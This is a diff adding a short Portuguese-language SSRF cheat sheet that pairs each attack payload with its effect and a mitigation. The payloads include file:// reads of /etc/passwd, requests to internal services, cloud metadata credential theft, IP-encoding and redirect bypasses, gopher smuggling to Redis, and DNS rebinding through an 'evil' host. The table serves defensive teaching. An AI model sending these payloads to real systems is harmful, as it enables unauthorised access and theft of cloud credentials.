@@ -1,0 +1,11 @@
+# SSRF - cheatsheet (reimplementado de OWASP / PayloadsAllTheThings / java-sec-code)
+# USO SOMENTE em sistemas proprios/autorizados.
+#
+# PAYLOAD (na URL)                                  | EFEITO                            | MITIGACAO
+file:///etc/passwd                                  | leitura arbitraria de arquivo     | allowlist de esquema (http/https)
+http://127.0.0.1:8080/admin                          | alcanca servico interno           | allowlist de host + checar IP
+http://169.254.169.254/latest/meta-data/iam/...      | credenciais da nuvem (IMDS)       | bloquear link-local; IMDSv2; egress
+http://[::1]/ , http://0177.0.0.1/ , http://2130706433| bypass de blocklist (IPv6/octal/dec)| checar endereco resolvido, nao a string
+http://allowed.example -> 302 http://127.0.0.1/       | bypass por redirect               | nao seguir redirects; revalidar hop
+gopher://127.0.0.1:6379/_...                          | protocol smuggling (Redis/etc)    | so http/https
+http://rebind.evil (resolve p/ 127.0.0.1)            | DNS rebinding                     | checar IP resolvido a cada conexao
